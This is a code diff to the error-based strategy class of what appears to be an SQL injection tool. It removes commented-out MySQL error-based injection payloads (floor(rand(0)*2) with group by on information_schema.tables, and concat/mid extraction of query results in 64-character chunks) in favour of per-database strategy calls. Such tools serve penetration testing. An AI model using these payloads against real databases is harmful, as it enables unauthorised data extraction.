@@ -21,17 +21,6 @@ public class ErrorbasedStrategy extends AbstractInjectionStrategy {
         LOGGER.info("Error based test...");
         
         String performanceSourcePage = MediatorModel.model().inject(
-//            MediatorModel.model().insertionCharacter + "+and(" +
-//                "select+1+" +
-//                "from(" +
-//                    "select+" +
-//                        "count(*)," +
-//                        "floor(rand(0)*2)" +
-//                    "from+" +
-//                        "information_schema.tables+" +
-//                    "group+by+2" +
-//                ")a" +
-//            ")--+"
             MediatorModel.model().insertionCharacter + 
             MediatorModel.model().sqlStrategy.getErrorBasedStrategyCheck()
         );
@@ -81,26 +70,6 @@ public class ErrorbasedStrategy extends AbstractInjectionStrategy {
     @Override
     public String inject(String sqlQuery, String startPosition, AbstractSuspendable stoppable) throws StoppableException {
         return MediatorModel.model().inject(
-//                MediatorModel.model().insertionCharacter + "+and" +
-//                    "(" +
-//                        "select+" +
-//                            "1+" +
-//                        "from(" +
-//                            "select+" +
-//                                "count(*)," +
-//                                "concat(" +
-//                                    "0x53514c69," +
-//                                    "mid(" +
-//                                        "(" + sqlQuery + ")," +
-//                                        startPosition + "," +
-//                                        "64" +
-//                                    ")," +
-//                                "floor(rand(0)*2)" +
-//                            ")" +
-//                            "from+information_schema.tables+" +
-//                            "group+by+2" +
-//                        ")a" +
-//                    ")--+");
             MediatorModel.model().insertionCharacter +
             MediatorModel.model().sqlStrategy.errorBasedStrategy(sqlQuery, startPosition)
         );
@@ -118,7 +87,6 @@ public class ErrorbasedStrategy extends AbstractInjectionStrategy {
     
     @Override
     public String getPerformanceLength() {
-        // MediatorModel.model().performanceLength
         /**
          * mysql errorbase renvoit 64 caractères - 'SQLi' = 60
          * on va prendre 60 caractères après le marqueur SQLi
